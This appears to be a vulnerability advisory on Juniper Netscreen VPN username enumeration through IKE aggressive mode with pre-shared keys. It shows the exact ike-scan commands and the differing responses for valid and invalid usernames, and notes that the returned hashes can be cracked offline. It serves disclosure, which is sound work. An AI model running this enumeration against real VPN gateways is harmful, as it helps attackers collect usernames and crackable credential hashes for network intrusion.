source: https://www.securityfocus.com/bid/14595/info

The Juniper Netscreen VPN implementation will identify valid usernames in IKE aggressive mode, when pre-shared key authentication is used. This allows for attackers to obtain a list of valid VPN users. With a valid username, an attacker can obtain hashed credentials against which a brute force attack may be performed. A successful crack would mean that the attacker has complete access to the network. 

The ike-scan options used in this example are:

-A Specify IKE Aggressive Mode. The default for ike-scan is
Main Mode.

-M Multiline: Display each payload on a separate line, which
makes the output easier to read.

--id=string Specify the string to be used for the ID payload.

10.0.0.1 The IP address of the target Netscreen.

3.1. Response to valid username "royhills@hotmail.com"

$ ike-scan -A -M --id=royhills@hotmail.com 10.0.0.1
Starting ike-scan 1.7.7 with 1 hosts (http://www.nta-monitor.com/ike-scan/)
10.0.0.1 Aggressive Mode Handshake returned
HDR=(CKY-R=21af4dbe2cecd5f0)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds
LifeDuration=28800)
VID=64405f46f03b7660a23be116a1975058e69e83870000000400000403
(Netscreen-05)
VID=4865617274426561745f4e6f74696679386b0100 (Heartbeat Notify)
KeyExchange(128 bytes)
Nonce(20 bytes)
ID(Type=ID_IPV4_ADDR, Value=10.0.0.1)
Hash(20 bytes)

Ending ike-scan 1.7.7: 1 hosts scanned in 0.136 seconds (7.37 hosts/sec). 1
returned handshake; 0 returned notify

3.2. Response to invalid username "invalid@hotmail.com"

$ ike-scan -A -M --id=invalid@hotmail.com 10.0.0.1
Starting ike-scan 1.7.7 with 1 hosts (http://www.nta-monitor.com/ike-scan/)

Ending ike-scan 1.7.7: 1 hosts scanned in 2.467 seconds (0.41 hosts/sec). 0
returned handshake; 0 returned notify